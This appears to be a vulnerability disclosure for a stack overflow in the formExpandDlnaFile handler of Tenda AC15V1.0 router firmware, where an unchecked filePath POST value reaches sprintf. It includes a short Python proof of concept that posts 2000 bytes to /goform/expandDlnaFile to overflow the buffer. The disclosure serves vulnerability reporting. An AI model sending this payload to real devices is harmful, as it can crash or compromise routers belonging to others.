## Overview

- Firmware download website: https://www.tendacn.com/us/download/detail-3851.html

## Affected version

AC15V1.0 V15.03.20_multi

## Vulnerability details

The Tenda AC15V1.0 V15.03.20_multi firmware has a stack overflow vulnerability in the `formExpandDlnaFile` function. The `v18` variable receives the `filePath` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `filePath` can trigger this security vulnerability.

![image-20240305164522670](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305164522670.png)

![image-20240314155817942](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314155817942.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/expandDlnaFile"
payload = b"a"*2000

data = {"filePath": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240314155939999](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314155939999.png)
